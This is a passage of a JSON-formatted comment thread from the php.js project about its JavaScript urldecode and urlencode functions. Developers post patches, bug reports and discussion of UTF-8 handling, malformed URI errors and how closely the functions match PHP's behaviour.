\\summary: http:\/\/kevin.vanzonneveld.net\r\n* \\author:   Original by: Philip Peterson\r\n* \t\t\t improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n* \\example: urlencode('Kevin van Zonneveld!');\r\n* \\returns: 'Kevin+van+Zonneveld%21'                                   \r\n*\/\r\nfunction urlencode( str ) {\r\n\tvar errorMessage = &quot;Javascript error at urlencode() function in yourfile.js. Please contact YourCompany's site administrator.&quot;;\r\n\t\r\n    var ret = str;\r\n    try\r\n    {\r\n\t    ret = ret.toString();\r\n\t    ret = encodeURIComponent(ret);\r\n\t    ret = ret.replace(\/%20\/g, '+');\r\n \t}\r\n \tcatch(err)\r\n \t{\r\n \t\talert(errorMessage);\r\n \t}\r\n \t\r\n    return ret;\r\n}"},{"date":"2008-06-16 00:14:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ doqkhanh: Why do we really need this handling? Because I don't believe PHP would return such an error string, and we would like to mimic it's behavior as strict as possible, to avoid strange bugs &amp; unexpected results; and so that the PHP documentation doesn't need to be changed."},{"date":"2008-07-11 15:29:45","author":"larry fisher","url":"","comment":"just want to thank you.  very useful..."},{"date":"2008-07-20 23:18:25","author":"thor s.","url":"","comment":"thank you a million times!!!!"},{"date":"2008-08-27 17:08:31","author":"johnrembo","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction urdencode (str) {\r\n    return decodeURIComponent(str);\r\n}\r\n[\/CODE]"},{"date":"2008-08-27 19:31:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ johnrembo: Hi John, thanks for your input again. We had some discussion about it earlier. It doesn't mimic PHP behavior enough. Differences between JavaScript's encoding functionalities can be found here: http:\/\/xkr.us\/articles\/javascript\/encode-compare\/"},{"date":"2008-12-31 03:59:29","author":"Guilherme","url":"","comment":"Hi, I guess your function doesn't work for some situations. Try this code (I'll appreciate if you send me the fixes):\r\n\r\n[CODE=\"javascript\"]\r\n&lt;?php\r\n\t$__t = '\\'a\\' +b+ \\\"c\\\" %d% \\\\\\\\  \\\\\\\\';\r\n?&gt;\r\nalert(\"&lt;?= $__t ?&gt;\");\r\nalert(\"&lt;?= urlencode($__t) ?&gt;\");\r\nalert(\"&lt;?= urldecode(urlencode($__t)) ?&gt;\");\r\nalert(urldecode(\"&lt;?= urlencode($__t) ?&gt;\")); \/\/ It fails with your function!\r\n[\/CODE]\r\n"},{"date":"2009-01-08 16:58:49","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Guilherme: Sorry your comment got stuck in the spamfilter. Akismet is a bit strict sometimes (can't really blame it, there are a lot of unrecognized words in your comment). Anyway:\r\n\r\nYou are not supposed to use php tags. This should prove to be more successful:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar $__t = '\\'a\\' +b+ \\&quot;c\\&quot; %d% \\\\\\\\  \\\\\\\\';\r\nalert(urlencode($__t));\r\n[\/CODE]"},{"date":"2009-01-13 19:00:30","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi there...Getting tired of me yet?\r\n\r\nThe following should be added to this function  and for urlencode():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nhistogram[&quot;'&quot;]   = '%27';\r\nhistogram['(']   = '%28';\r\nhistogram[')']   = '%29';\r\nhistogram['*']   = '%2A';\r\nhistogram['~']   = '%7E';\r\n[\/CODE]\r\n\r\nAnd once you fix the above, you can also get rawurlencode and rawurldecode by simply removing the following line from each of the corresponding files:\r\n\r\n[CODE=&quot;Javascript&quot;]histogram['%20'] = '+';[\/CODE]\r\n\r\n(That's the only difference with the raw form)"},{"date":"2009-01-14 11:06:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Tired? maybe. Of you? Never :) Keep 'em coming! :D"},{"date":"2009-04-07 16:20:38","author":"Lars Fischer","url":"","comment":"This is a wonderful Project! I'm glad, finding it today! Really good work!\r\n\r\nFor the german special-chars, this should be added to the urlencode and urldecode-function:\r\n\r\n[CODE]\r\nhistogram['\\u00DC']   = '%DC';\r\nhistogram['\\u00FC']   = '%FC';\r\nhistogram['\\u00C4']   = '%D4';\r\nhistogram['\\u00E4']   = '%E4';\r\nhistogram['\\u00D6']   = '%D6';\r\nhistogram['\\u00F6']   = '%F6';\r\n[\/CODE]\r\nhistogram['\\u00DF']   = '%DF';"},{"date":"2009-04-14 12:11:58","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Lars Fischer: Thanks for helping us make it better!"},{"date":"2009-08-07 00:15:49","author":"Orlando","url":"","comment":"I was working with norwegian characters but wasn't able to get it working for uppercase characters(\u00d8,\u00c5,\u00c6) until I added the following lines to hashmap:\n\n[CODE]\nhash_map['\\u00C6']   = '%C3%86';\nhash_map['\\u00D8']   = '%C3%98';\nhash_map['\\u00C5']   = '%C3%85';\n[\/CODE]\n\nI got those values when encoding at php with urlencode(). "},{"date":"2009-08-07 05:59:40","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Orlando, thanks for pointing this out. However, if someone has some time now, could we look into solving this problem (that keeps coming up) of seeing non-ASCII characters translated correctly for all languages? There must be some algorithm we can use rather than just pasting new translations piecemeal..."},{"date":"2009-08-16 15:31:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Agreed. until we do though, I'd like to add Orlando's improvements to the hash_map\n\n@ Orlando: Thanks for sharing, fixed in SVN"},{"date":"2009-08-17 17:35:37","author":"CDuv","url":"http:\/\/claude.duvergier.fr","comment":"I had a \"malformed URI sequence\" JavaScript error in Firefox\/3.5.2 (Gecko\/20090729) error console when trying to url-decode : \"%E7a%20plante\" (\"\u00e7a plante\").\n\nI read on OpenLayers bugtracker Ticket #1704 (http:\/\/trac.openlayers.org\/ticket\/1704) that JavaScript unescape() function could help.\n\nSo  I gave it a chance and changed[CODE]ret = decodeURIComponent(ret);[\/CODE](line 90 in phpjs.org::urldecode() v908.1617)\nTo[CODE]ret = decodeURIComponent(unescape(ret));[\/CODE]\nAs it solved by problem I would like to share it with you :)"},{"date":"2009-08-18 12:10:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@CDuv: The escape sequence, \"%E7a%20plante\" gives an invalid character in PHP as well. Are you using UTF-8 like a good netizen? :)  The urlencode() (in PHP or JavaScript) used on \"\u00e7a plante\" should be giving: \"%C3%A7a+plante\" which can then be decoded by either as well. This function needs to drop some of the code that was mistakenly added for the sake of ISO Latin--which is not used in PHP or JS, from my testing."},{"date":"2009-08-22 17:14:42","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: You are the man! :D Hands down!"},{"date":"2009-08-30 12:26:04","author":"Shamun Toha","url":"","comment":"[code]\nfunction urldecode( str ) {\n    \/\/ Decodes URL-encoded string  \n    \/\/ \n    \/\/ version: 907.503\n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/urldecode\n    \/\/ +   original by: Philip Peterson\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +      input by: AJ\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +   improved by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +      input by: travc\n    \/\/ +      input by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +   bugfixed by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +   improved by: Lars Fischer\n    \/\/ +      input by: Ratheous\n\t\/\/ +   improved by: @Shamun Toha\n\t\/\/ +       note by: - Shamun: decodeURIComponent failed on many characters\n    \/\/ %        note 1: info on what encoding functions to use from: http:\/\/xkr.us\/articles\/javascript\/encode-compare\/\n    \/\/ *     example 1: urldecode('Kevin+van+Zonneveld%21');\n    \/\/ *     returns 1: 'Kevin van Zonneveld!'\n    \/\/ *     example 2: urldecode('http%3A%2F%2Fkevin.vanzonneveld.net%2F');\n    \/\/ *     returns 2: 'http:\/\/kevin.vanzonneveld.net\/'\n    \/\/ *     example 3: urldecode('http%3A%2F%2Fwww.google.nl%2Fsearch%3Fq%3Dphp.js%26ie%3Dutf-8%26oe%3Dutf-8%26aq%3Dt%26rls%3Dcom.ubuntu%3Aen-US%3Aunofficial%26client%3Dfirefox-a');\n    \/\/ *     returns 3: 'http:\/\/www.google.nl\/search?q=php.js&ie=utf-8&oe=utf-8&aq=t&rls=com.ubuntu:en-US:unofficial&client=firefox-a'\n\t\/\/ *\t example 4: urldecode(\"%3Ctr%3E%3Ctd%3Einfo%40jquery.com%20space%20%E9%3C%2Ftd%3E%3C%2Ftr%3E\");\n\t\/\/ *\t returns 4: <tr><td>info@jquery.com Space e<\/td><\/tr>\n    \n    var hash_map = {}, ret = str.toString(), unicodeStr='', hexEscStr='';\n    \n    var replacer = function(search, replace, str) {\n        var tmp_arr = [];\n        tmp_arr = str.split(search);\n        return tmp_arr.join(replace);\n    };\n    \n    \/\/ The hash_map is identical to the one in urlencode.\n    hash_map[\"'\"]   = '%27';\n    hash_map['(']   = '%28';\n    hash_map[')']   = '%29';\n    hash_map['*']   = '%2A';\n    hash_map['~']   = '%7E';\n    hash_map['!']   = '%21';\n    hash_map['%20'] = '+';\n    hash_map['\\u00DC'] = '%DC';\n    hash_map['\\u00FC'] = '%FC';\n    hash_map['\\u00C4'] = '%D4';\n    hash_map['\\u00E4'] = '%E4';\n    hash_map['\\u00D6'] = '%D6';\n    hash_map['\\u00F6'] = '%F6';\n    hash_map['\\u00DF'] = '%DF';\n    hash_map['\\u20AC'] = '%80';\n    hash_map['\\u0081'] = '%81';\n    hash_map['\\u201A'] = '%82';\n    hash_map['\\u0192'] = '%83';\n    hash_map['\\u201E'] = '%84';\n    hash_map['\\u2026'] = '%85';\n    hash_map['\\u2020'] = '%86';\n    hash_map['\\u2021'] = '%87';\n    hash_map['\\u02C6'] = '%88';\n    hash_map['\\u2030'] = '%89';\n    hash_map['\\u0160'] = '%8A';\n    hash_map['\\u2039'] = '%8B';\n    hash_map['\\u0152'] = '%8C';\n    hash_map['\\u008D'] = '%8D';\n    hash_map['\\u017D'] = '%8E';\n    hash_map['\\u008F'] = '%8F';\n    hash_map['\\u0090'] = '%90';\n    hash_map['\\u2018'] = '%91';\n    hash_map['\\u2019'] = '%92';\n    hash_map['\\u201C'] = '%93';\n    hash_map['\\u201D'] = '%94';\n    hash_map['\\u2022'] = '%95';\n    hash_map['\\u2013'] = '%96';\n    hash_map['\\u2014'] = '%97';\n    hash_map['\\u02DC'] = '%98';\n    hash_map['\\u2122'] = '%99';\n    hash_map['\\u0161'] = '%9A';\n    hash_map['\\u203A'] = '%9B';\n    hash_map['\\u0153'] = '%9C';\n    hash_map['\\u009D'] = '%9D';\n    hash_map['\\u017E'] = '%9E';\n    hash_map['\\u0178'] = '%9F';\n\t\/\/ on decodeURIComponent failure.\n\thash_map['<'] \t   = '%3C';\n\thash_map['>'] \t   = '%3E';\n\thash_map['\/'] \t   = '%2F';\n\thash_map['@']\t   = '%40'; \n\thash_map['e']\t   = '%E9';\t\n\thash_map[' ']\t   = '%20';\n\t\n\n    for (unicodeStr in hash_map) {\n        hexEscStr = hash_map[unicodeStr]; \/\/ Switch order when decoding\n        ret = replacer(hexEscStr, unicodeStr, ret); \/\/ Custom replace. No regexing\n    }\n    \n    \/\/ End with decodeURIComponent, which most resembles PHP's encoding functions\n    ret = decodeURIComponent(ret);\n\n    return ret;\n}\n[\/code]\n\nTest suite:\n[code]\n\/\/ output this: <tr><td>info@jquery.com Space e<\/td><\/tr>\nvar a = \"%3Ctr%3E%3Ctd%3Einfo%40jquery.com%20space%20%E9%3C%2Ftd%3E%3C%2Ftr%3E\";\nalert ( urldecode(a) );\n[\/code]"},{"date":"2009-09-04 19:03:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Shamun Toha: If I'm not mistaken Brett is working on a different method so that we don't have to work work with hash_maps anymore."},{"date":"2009-10-29 03:04:53","author":"ajo","url":"","comment":"i love it...i just love it...\nbut is it 100% free to use?"},{"date":"2009-10-29 07:05:02","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@ajo: Yes, 100% free as in free donuts (I don't drink alcohol)... :)  You only need to add a copy of the license at http:\/\/phpjs.org\/pages\/license with any code you redistribute for others."},{"date":"2010-01-01 04:42:45","author":"Rob","url":"","comment":"I think: [code]return decodeURIComponent(str).replace(\/\\+\/g, '%20');[\/code]\n\nshould be: [code]return decodeURIComponent(str.replace(\/\\+\/g, '%20'));[\/code]\n"},{"date":"2010-01-01 07:56:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Argh--Embarrassing mistake. Thanks for the fix. Done in Git..."},{"date":"2010-01-07 22:54:22","author":"David","url":"","comment":"The current version works pretty well, but need of one patch to \"space bug\":\n\n[CODE]\n\/\/ Current\n    return decodeURIComponent(str).replace(\/\\+\/g, '%20');\n\/\/ Correct\n    return decodeURIComponent(str.replace(\/\\+\/g, '%20'));\n[\/CODE]\n\nBye."},{"date":"2010-01-08 03:33:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@David, Yes, thanks for reporting; it was just recently fixed (see the comments below), but the changes haven't yet made it to the site. FYI, the \"raw js source\" always has the very latest version (and in this case is the same as you suggested)."},{"date":"2010-09-08 21:09:55","author":"anton","url":"","comment":"hey.... \n\nI find a bug \nUncaught URIError: URI malformed \n[code]\n  ret = decodeURIComponent(ret);\n[\/code]\n\n\nHELP ME.."},{"date":"2010-09-08 21:33:42","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ anton: Please provide the exact url you are passing to this function, as it looks like your input is broken."},{"date":"2010-09-09 08:41:53","author":"anton","url":"","comment":"%27Musim+Depan%2C+Barca+Rekrut+Torres+%26amp%3B+Fabregas%27%3Cbr+%2F%3EAzulgrana+akan+mengeluarkan+dana+%A3100+juta.+\nINPUT : \n\n%23%3Ca+href%3D%22%23%21%2Ftopics%2Fsports%22+%3Esports%3C%2Fa%3E+%23%3Ca+href%3D%22%23%21%2Ftopics%2Fentertainment%22+%3Eentertainment%3C%2Fa%3E+%23%3Ca+href%3D%22%23%21%2Ftopics%2Fnews%22+%3Enews%3C%2Fa%3E+%23%3Ca+href%3D%22%23%21%2Ftopics%2Fliverpool%22+%3Eliverpool%3C%2Fa%3E+%23%3Ca+href%3D%22%23%21%2Ftopics%2Fbarca%22+%3Ebarca%3C%2Fa%3E+%3Cbr+%2F%3E%3Ca+href%3D%22http%3A%2F%2Fbola.vivanews.com%2Fnews%2Fread%2F174352--musim-depan--barca-rekrut-torres---fabregas-%22+target%3D%22_blank%22%3Ehttp%3A%2F%2Fbola.vivanews.com%2Fnews%2Fread%2F174352--musim-depan--barca-rekrut-torres---fabregas-%3C%2Fa%3E"},{"date":"2011-05-31 17:23:57","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl\/","comment":"[CODE]\nurldecode('%80');\n[\/CODE]\n\nResult in PHP:\n[CODE]\n\u20ac \/\/ in Windows-1252 character set\n[\/CODE]\n\nResult in JavaScript:\n[CODE]\nERROR: malformed URI sequence\n[\/CODE]\n\nSuggested fix: revert to old version of urldecode, @\nhttps:\/\/github.com\/kvz\/phpjs\/blob\/e81fa731a23fc07e14793796a23c5b2ebd2bb262\/functions\/url\/urldecode.js\n\n\n\n"},{"date":"2011-05-31 18:01:17","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Tim: All sites should be in UTF-8 nowadays (recommended by HTML5 also). Try this:\n\n<?php\nheader('content-type:text\/html;charset=utf8');\nprint urldecode('%E2%82%AC');\n?>\n\nand\n\nalert(urldecode('%E2%82%AC'))"},{"date":"2011-06-01 10:17:31","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl\/","comment":"@Brett: alert(urldecode('%E2%82%AC')) in Firefox 4.0.1 throws the same error:\n\n[CODE]\nURIError: malformed URI sequence\n[\/CODE]\n\n(I don't think this has anything to do with the character set, but i only pointed it out because '\u20ac' does not exist in latin1 \/ ISO-8859-1. So one should take that in consideration when running the mentioned test.)"},{"date":"2011-06-01 12:24:26","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Tim: Strange---I'm using FF 4.0.1 also and not getting an error. Character set shouldn't matter for JavaScript, but it does for PHP (i.e., %80 is not valid for UTF8 so wanted to compare apples to apples)."},{"date":"2011-06-01 12:59:37","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl\/","comment":"@Brett: I don't get it. I get the same error in Chrome 11.0.696.71 (URIError: URI malformed) and IE 9.0.8 too. Maybe it has something to do with my locale-settings... (Dutch, so pretty straightforward)? Anyway... The old version works perfectly and uses the same decodeURIComponent() in the end!"},{"date":"2011-06-01 19:26:11","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Tim: Just to verify: You are using the latest version above? (essentially just a light wrapper for decodeURIComponent). And in your script you have nothing else besides this function and the alert with the call to urldecode?"},{"date":"2011-06-01 23:25:59","author":"Tim de Koning","url":"http:\/\/www.kingqsuare.nl","comment":"@Brett: Yes. I tested this this a Win XP and Windows 7 machine now in multiple browsers, all with the same result."},{"date":"2011-06-02 04:53:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Tim: Send me a file with your exact code to my Yahoo address : brettz9"},{"date":"2011-06-03 11:03:00","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl\/","comment":"@Brett: done! :-)"},{"date":"2011-07-29 14:57:29","author":"Dj","url":"","comment":"Instead of replace '+' with '%20', replace it with an space directly, then is not redundant and decodeURIComponent() will has less characters to proccess"},{"date":"2012-01-24 07:51:35","author":"Rajiva","url":"","comment":"Yesterday I got same problem : malformed URI sequence. I had try all of solution that you're shown, but no one solved my problem. \nThan, I try another way that I can do for fix the problem. I solved the problem with cutting half of tag value (string) of my XML file with substr($string, 0, 3000). \n\nI think the browser & program can't handle and processing large string. Based on my experience, the program can work properly while the string contain maximal 3000 character. Is anyone have same experience with me?"},{"date":"2012-03-28 10:05:56","author":"Ye Lin Htun","url":"","comment":"I reli appreciate your tutorial."},{"date":"2012-04-23 14:49:42","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"I wonder how you got so good. HaHa ! This is really a fascinating blog, lots of stuff that I can get into. One thing I just want to say is that your design is so perfect ! You certainly know how to get a girls attention ! I\u2019m glad that you\u2019re here. I feel like I\u2019ve learned something new by being here \n"},{"date":"2012-07-05 11:37:22","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Rajiva: Can you put your long sequence somewhere so we can confirm? I am not able to replicate with decodeURIComponent() (which would be giving the URI error) even with a very large sequence:\n\n[CODE]\nvar arr = decodeURIComponent(new Array(101000).join('%20'));\n[\/CODE]"},{"date":"2012-07-05 11:39:05","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Rajiva: In addition to my last question, what browser were you using?"}],"urlencode":[{"date":"2008-04-18 02:16:28","author":"Philip Peterson","url":"","comment":"Just so you know, in phpjs_tester, the examples for urlencode and nl2br are both wrong (they don't just not work).  ;-)"},{"date":"2008-04-18 03:24:35","author":"Philip Peterson","url":"","comment":"Woah... strike that, apparently it's because you replaced escape with encodeURIComponent?  They function a little bit differently, and escape() is the most similar to PHP's functionality."},{"date":"2008-04-18 09:14:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Yeah I did it because Michael reached the conclusion that encodeURIComponent had better PHP compatibility.\r\n\r\nI guess the tester doesn't work because in it current form it fails to handle \\n characters, and maybe the exclamation mark gets translated twice, I have to double check that.\r\n\r\nDiscussion on encodeURIComponent vs escape can be found here:\r\nhttp:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_http_build_query\/#comment_1071\r\n\r\nIf you reach a different conclusion, please let me know ok?"},{"date":"2008-08-27 17:07:38","author":"johnrembo","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction urlencode (str) {\r\n    return encodeURIComponent(str);\r\n}\r\n[\/CODE]"},{"date":"2008-08-27 19:31:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ johnrembo: Hi John, thanks for your input again. We had some discussion about it earlier. It doesn't mimic PHP behaviour enough. Differences between JavaScript's encoding functionalities can be found here: http:\/\/xkr.us\/articles\/javascript\/encode-compare\/"},{"date":"2008-08-28 23:27:41","author":"AJ","url":"http:\/\/www.tiredangel.com","comment":"It's a good function, but the it needs to encode the forward slash character also. I'd recommend adding the following line before the return statement:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nret = ret.replace(\/\\\/\/g,'%2F');\r\n[\/CODE]\r\n\r\nShort of going into the PHP source, this seems to work reasonably similarly."},{"date":"2008-08-29 12:18:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ AJ: I've rewritten the urlencoding functions, should be a great improvement! Thanks for your input."},{"date":"2008-10-09 14:08:26","author":"bukura","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction urlencode (str) {\r\n\tvar res=&quot;&quot;;\r\n\tfor (i=0;i&lt;str.length;i++) {\r\n\t\tif(str[i]==' ') {\r\n\t\t\tres+='+';\r\n\t\t}else {\r\n\t\t\tres+=escape(str[i]);\r\n\t\t}\r\n\t}\r\n\treturn res;\r\n}\r\n[\/CODE]"},{"date":"2008-10-10 14:55:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ bukura: Unfortunately we have some bad experiences with escape, as it does not provide PHP compatible output. Please also see the link we refer to in the script."},{"date":"2009-06-18 11:00:42","author":"Martin Allchin","url":"http:\/\/www.mallchin.in","comment":"The UK pound sign (\u00a3) encodes with multiple escape sequences giving:\n\n[code]\n%C2%A3\n[\/code]\n\nrather than\n\n[code]\n%A3\n[\/code]\n\nThis is due to conversion into UTF-8. I suggest adding the following into the histogram array as a simple fix:\n\n[code]\nhistogram['%C2%A3'] = '%A3';\n[\/code]\n"},{"date":"2009-06-18 13:04:12","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Thanks, Martin. Can you explain why we don't want UTF-8 though? I see when I test this with PHP, if the file is encoded in UTF-8, I get the same results. Given the tide turning toward UTF-8, not to mention its compatibility with all languages, I think it's best to try for that, no? \n\nI guess we could add a custom \"phpjs.\" configuration option (triggered through our ini_set() which allowed for other character sets), but we'd probably want to use some generic algorithm to translate assuming Latin-1 input (or whatever) rather than adding character conversions case by case. What do you think?"},{"date":"2009-06-18 13:07:26","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Martin, to add to my comment just now, I see escape() would do the trick, but that is deprecated, again because it assumes Latin-1."},{"date":"2009-10-13 21:48:39","author":"Donovan Walker","url":"http:\/\/donovanwalker.com","comment":"Have to love this:\nhttp:\/\/phpjs.org\/functions\/urlencode:573#comment_1090"},{"date":"2009-10-14 02:15:36","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Donovan Walker: Yeah, except that that's not perfectly equivalent to what urlencode() does."},{"date":"2009-10-28 02:28:55","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Ok, \n\nI've updated in git (at http:\/\/github.com\/kvz\/phpjs\/commit\/2691be636ea1d3f8d035bfbe11fb2e05657b48da ) to a simpler (and faster) implementation based on encodeURIComponent (for all the urlencode\/decode functions), but fully adjusting to how PHP is SUPPOSED to become as of PHP 5.3\/6.0 (though I didn't see news of it yet). If you want PHP how it is now, to the encode functions you should add (since encodeURIComponent() doesn't do it) an additional:\n\n[CODE].replace(\/~\/g, '%7E');[\/CODE]\n\n...since PHP at present outdatedly encodes the tilde, while later RFC's have let it be unencoded.\n\n(The decode functions in PHP already can decode the tilde ok, so no need to \"correct\" here.)\n\nTwo other lessons learned (I hope) from RFC3986 (at http:\/\/labs.apache.org\/webarch\/uri\/rfc\/rfc3986.html ):\n1) The reason why \"!\", \"'\", \"(\", \")\", and \"*\" are now reserved (though not by the time encodeURIComponent was added to  JavaScript, thus it is outdated and has to be corrected), even though they have no special official URI delimiting function, is because as characters normally usable for other purposes, it helps indicate that the other items in the group to which they belong (e.g., as with \"&\", \"=\", etc.) are generally not safe to be used as is without escaping. I guess it also allows them to be used for unofficial purposes.\n2) Although there are no PHP analogues to encodeURI() in JavaScript (as urlencode() and rawurlencode() pretty much are for encodeURIComponent), so we don't have to worry about it as far as PHP.JS here, another way in which JavaScript is a little behind the times is in encodeURI() as far as how it should stop escaping square brackets, as they have been made reserved in order to be usable with IPv6 (delimiters for an IP literal in the 'host'). One might thus \"fix\" encodeURI thus (but NOT encodeURIComponent which is SUPPOSED to escape delimiters like '\/' and now '['):\n\n[CODE]function fixedEncodeURI () {\n    return encodeURI(str).replace(\/%5B\/g, '[').replace(\/%5D\/g, ']');\n}[\/CODE]\n\nFor the record, we can do all of the straight replaces above because UTF-8 only uses bytes 0x00 to 0x7F for single-byte ASCII--these bytes can therefore be safely replaced back-and-forth from their escaped form to their unescaped form without fear that it is being used as part of a multi-byte sequence.\n\nAgain, folks, be very careful before submitting patches that you realize that our encoding\/decoding is done here assuming UTF-8; you have to serve your PHP pages with a UTF-8 header (as you should) if you want comparable behavior on the PHP side.\n\nBelow is the old version, just for easy reference (e.g., if you happen to want to know how to make your own UTF-8 octets):\n\n[CODE]function urlencode (str) {\n    \/\/ http:\/\/kevin.vanzonneveld.net\n    \/\/ +   original by: Philip Peterson\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +      input by: AJ\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +   improved by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +   bugfixed by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +      input by: travc\n    \/\/ +      input by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +   bugfixed by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +   improved by: Lars Fischer\n    \/\/ +      input by: Ratheous\n    \/\/ +      reimplemented by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +   bugfixed by: Joris\n    \/\/ %          note 1: This reflects PHP 5.3\/6.0+ behavior\n    \/\/ *     example 1: urlencode('Kevin van Zonneveld!');\n    \/\/ *     returns 1: 'Kevin+van+Zonneveld%21'\n    \/\/ *     example 2: urlencode('http:\/\/kevin.vanzonneveld.net\/');\n    \/\/ *     returns 2: 'http%3A%2F%2Fkevin.vanzonneveld.net%2F'\n    \/\/ *     example 3: urlencode('http:\/\/www.google.nl\/search?q=php.js&ie=utf-8&oe=utf-8&aq=t&rls=com.ubuntu:en-US:unofficial&client=firefox-a');\n    \/\/ *     returns 3: 'http%3A%2F%2Fwww.google.nl%2Fsearch%3Fq%3Dphp.js%26ie%3Dutf-8%26oe%3Dutf-8%26aq%3Dt%26rls%3Dcom.ubuntu%3Aen-US%3Aunofficial%26client%3Dfirefox-a'\n\n    var hexStr = function (dec) {\n        return '%' + (dec < 16 ? '0' : '') + dec.toString(16).toUpperCase();\n    };\n\n    var ret = '',\n            unreserved = \/[\\w.-]\/; \/\/ A-Za-z0-9_.- \/\/ Tilde is not here for historical reasons; to preserve it, use rawurlencode instead\n    str = (str+'').toString();\n\n    for (var i = 0, dl = str.length; i < dl; i++) {\n        var ch = str.charAt(i);\n        if (unreserved.test(ch)) {\n            ret += ch;\n        }\n        else {\n            var code = str.charCodeAt(i);\n            if (0xD800 <= code && code <= 0xDBFF) { \/\/ High surrogate (could change last hex to 0xDB7F to treat high private surrogates as single characters); https:\/\/developer.mozilla.org\/index.php?title=en\/Core_JavaScript_1.5_Reference\/Global_Objects\/String\/charCodeAt\n                ret += ((code - 0xD800) * 0x400) + (str.charCodeAt(i+1) - 0xDC00) + 0x10000;\n                i++; \/\/ skip the next one as we just retrieved it as a low surrogate\n            }\n            \/\/ We never come across a low surrogate because we skip them, unless invalid\n            \/\/ Reserved assumed to be in UTF-8, as in PHP\n            else if (code === 32) {\n                ret += '+'; \/\/ %20 in rawurlencode\n            }\n            else if (code < 128) { \/\/ 1 byte\n                ret += hexStr(code);\n            }\n            else if (code >= 128 && code < 2048) { \/\/ 2 bytes\n                ret += hexStr((code >> 6) | 0xC0);\n                ret += hexStr((code & 0x3F) | 0x80);\n            }\n            else if (code >= 2048) { \/\/ 3 bytes (code < 65536)\n                ret += hexStr((code >> 12) | 0xE0);\n                ret += hexStr(((code >> 6) & 0x3F) | 0x80);\n                ret += hexStr((code & 0x3F) | 0x80);\n            }\n        }\n    }\n    return ret;\n}[\/CODE]"},{"date":"2009-11-07 18:32:19","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Brett, thanks so much for your research. This stuff is rocking so hard.. : ) you make me proud man!"},{"date":"2009-11-19 19:29:30","author":"Mohsen Haeri","url":"http:\/\/www.tabatabaiyazdi.com","comment":"Thank you very much...\n"},{"date":"2011-01-04 09:54:39","author":"Pavani","url":"","comment":"Thanks a lot for the help. You saved me."},{"date":"2011-06-24 07:15:35","author":"Demon","url":"http:\/\/demon.tw","comment":"[code]\nstr = (str + '').toString();\n[\/code]\nThis seems unnecessary because encodeURIComponent will call toString method internally"},{"date":"2011-08-04 11:00:29","author":"Kolink","url":"http:\/\/pokefarm.org\/","comment":"My I suggest, intead of\n[code]return encodeURIComponent(str).replace(\/!\/g, '%21').replace(\/'\/g, '%27').replace(\/\\(\/g, '%28').\n    replace(\/\\)\/g, 